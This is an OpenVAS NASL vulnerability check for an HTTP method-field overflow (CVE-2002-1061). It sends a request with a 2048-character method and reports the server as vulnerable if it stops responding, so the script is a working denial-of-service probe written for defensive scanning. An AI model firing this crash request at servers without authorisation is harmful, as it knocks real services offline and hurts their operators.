###############################################################################
# OpenVAS Vulnerability Test
# $Id: www_too_long_method.nasl 4797 2016-12-17 14:04:59Z cfi $
#
# HTTP method overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CAN
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11065");
  script_version("$Revision: 4797 $");
  script_tag(name:"last_modification", value:"$Date: 2016-12-17 15:04:59 +0100 (Sat, 17 Dec 2016) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(5319);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2002-1061");
  script_name("HTTP method overflow");
  script_category(ACT_DENIAL);
  # All the www_too_long_*.nasl scripts were first declared as
  # ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
  # The web server might be killed by those generic tests before OpenVAS
  # has a chance to perform known attacks for which a patch exists
  # As ACT_DENIAL are performed one at a time (not in parallel), this reduces
  # the risk of false positives.
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "http_version.nasl", "no404.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  tag_summary = "It was possible to kill the web server by
  sending an invalid request with a too long HTTP method field";

  tag_impact = "A cracker may exploit this vulnerability to make your web server
  crash continually or even execute arbirtray code on your system.";

  tag_solution = "Upgrade your software or protect it with a filtering reverse proxy.";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");

port = get_http_port( default:80 );

if( http_is_dead( port:port, retry:4 ) ) exit( 0 );

req = string( crap( data:"HEADOPENVASOPENVAS", length:2048 ), " / HTTP/1.0\r\n\r\n" );
http_send_recv( port:port, data:req );

if( http_is_dead( port:port ) ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
